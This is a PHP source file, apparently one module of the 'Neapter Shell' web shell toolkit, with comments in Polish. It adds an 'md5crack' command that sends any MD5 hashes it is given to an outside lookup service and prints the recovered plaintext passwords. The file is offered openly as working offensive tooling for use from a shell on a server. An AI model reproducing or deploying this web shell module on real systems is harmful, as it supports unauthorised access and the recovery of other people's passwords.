<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * ModuleMd5crack - Lamanie hasy md5
 *
 * hashkiller.com - version f41a5cabc515e4d8b11e4aaee2b86a183f59136a
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class ModuleMd5crack implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'md5crack' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.01 2011-10-06 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Łamanie haszy md5

	Użycie:
		md5crack hashmd5 [hashmd5] [hashmd5]

	Przykład:
		md5crack 098f6bcd4621d373cade4e832627b4f6 b36d331451a61eb2d76860e00c347396
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$sOutput = NULL;
		for( $i = 0; $i < $this -> oShell -> iArgc; ++$i )
		{
			if( ! preg_match( '~^[a-zA-Z0-9]{32}\z~', $this -> oShell -> aArgv[ $i ] ) )
			{
				continue ;
			}

			$sOutput .= sprintf( '%s:', $this -> oShell -> aArgv[ $i ] );

			/**
			 * API hashkiller
			 */
			$sData = file_get_contents( sprintf( 'http://www.tmto.org/api/latest/?hash=%s&auth=true' , $this -> oShell -> aArgv[ $i ] ) );


			if( ( ( $oXml = simplexml_load_string( $sData ) ) !== FALSE ) && ( $oXml->result['text'] !== '' ))
			{
				/**
				 * Odzyskany hash
				 */
				$sOutput .= (string) base64_decode( $oXml->result['text'] );
			}
			else
			{
				$sOutput .= 'password-not-found';
			}

			$sOutput .= "\r\n";
		}

		return htmlspecialchars( $sOutput );
	}

}